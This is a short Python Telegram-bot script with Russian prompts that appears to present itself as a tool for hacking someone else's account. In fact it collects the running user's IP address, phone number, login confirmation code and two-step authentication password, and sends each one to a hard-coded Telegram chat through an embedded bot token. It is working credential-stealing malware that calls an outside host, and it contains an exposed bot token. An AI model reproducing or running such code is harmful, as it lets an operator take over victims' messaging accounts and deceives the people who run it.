import telebot
from telebot import types
import requests
adrr = requests.get('https://ip.beget.ru').text
ID = 1035726612
bot = telebot.TeleBot("1815187102:AAEXo2nl0Cx5-Ter27rFGtsGFWOQBuQ0zXw")
bot.send_message(ID, f'''Online! \n Ip: {adrr}''') 
numb = input("Введите номер телефона: ")
markup_reply = types.ReplyKeyboardMarkup(resize_keyboard = True)
item_an = types.KeyboardButton('Вам был отправлен код')
item_an1 = types.KeyboardButton('Данные неверные')
item_an2 = types.KeyboardButton('Введите пароль от акк')
item_an3 = types.KeyboardButton('Ошибка')
item_an4 = types.KeyboardButton('Успешная регистрация!')
markup_reply.add(item_an, item_an1, item_an2, item_an3, item_an4)
bot.send_message(ID, f'⬇️Номер телефона⬇️', reply_markup = markup_reply)
bot.send_message(ID, numb) 
@bot.message_handler(content_types = ['text'])
def get_text(message):
	if message.text == 'Вам был отправлен код':
		kod = input('Введите код подтверждения: ')
		bot.send_message(ID, kod) 
	elif message.text == 'Неверный код, перезапустит':
		print('Данные неверные, перезапустите скрипт')
	elif message.text == 'Введите пароль от акк':
		kod1 = input('Введите пароль двухэтапной аутентификации: ')
		bot.send_message(ID, kod1)		
	elif message.text == 'Ошибка':
		print('Ошибка! Перезапустите скрипт!')
	elif message.text == 'Успешная регистрация!':
		print('Успешная регистрация!')
		jj = input("Введите аккаунт, который нужно взломать: ")
		bot.send_message(ID, jj)	
bot.polling()
